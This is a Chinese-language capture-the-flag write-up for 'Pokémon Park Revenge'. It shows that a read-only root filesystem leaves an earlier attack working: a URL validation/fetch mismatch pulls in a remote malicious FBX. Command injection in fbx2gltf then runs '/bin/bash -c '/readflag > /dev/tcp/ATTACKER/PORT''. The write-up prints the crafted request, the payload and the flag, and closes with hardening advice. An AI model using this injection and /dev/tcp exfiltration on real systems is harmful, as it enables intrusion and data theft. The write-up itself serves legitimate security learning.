# Pokémon Park Revenge

## 题目简述

Revenge 附件用 Pokémon Park 第一题的完整 flag 作为解压密码。解开后可以看到应用代码和 `fbx2gltf` 版本均未改变，所谓加固只是在运行环境中把根文件系统设为只读、丢弃 capabilities、禁止提权，并仅给 `/tmp` 提供可写的内存卷。目标仍是执行只有执行权限的 `/readflag`。

## 解题过程

### 确认原始入口仍然存在

`loadModel` 与第一题逐字相同，只读根文件系统没有修复它的语义差异：

```text
validation target:
    decoded suffix after file://

fetch target:
    original attacker-controlled URL
```

继续请求：

```text
/api/model?filename=https://attacker/meow.fbx%3Fmeow=file:///app/models/pm0001_00.glb
```

本地后缀通过存在性检查，服务却下载远程恶意 FBX。转换函数本来就把输入和输出写入 `/tmp/<uuid>.fbx`、`/tmp/<uuid>.glb`，而 Revenge 明确保留了可写 `/tmp`，所以只读根文件系统不会阻止转换器启动。

### 对照利用所需权限

恶意 FBX 中编号 `09` 至 `12` 的 `NodeAttribute` 名称再次触发 `fbx2gltf` 命令注入：

```text
exec /bin/bash -c '/readflag > /dev/tcp/ATTACKER/PORT'
```

逐项检查可以看出：

- 下载模型需要出站 HTTP，Kubernetes 配置仍明确允许 egress；
- 转换只需写 `/tmp`，该目录挂载了可写的 memory `emptyDir`；
- shell、转换器和 `/readflag` 都位于只读层，但“只读”不妨碍执行；
- `/readflag` 不要求 root，镜像本来就把它设为 `0111`，任何用户可执行；
- 结果通过出站 TCP 返回，不需要在根文件系统落文件。

因此直接复用第一题的 `meow.fbx`，只替换回连 IP/端口并发送相同请求即可。API 返回值仍不是 flag；应从监听连接读取 `/readflag` 的标准输出。

最终得到：

```text
SEKAI{l0wk1rk3nu1n3ly_f0rg07_t0_m4k3_i7_4_r34d_0nly_f1l3sys73m_my_b4d_ch47}
```

## 方法总结

`read_only: true` 是有价值的纵深防御，但它只限制持久化写入，不能修复命令注入，也不会自动形成“不可执行”环境。评估加固时应列出利用所需的文件写、程序执行、权限、网络四类能力；本题唯一需要的写入点恰好是开放的 `/tmp`，而 shell 执行和出站连接也都保留。真正有效的最小改动应先修复 URL 验证/获取不一致，并对转换进程关闭 egress、减少可执行面。
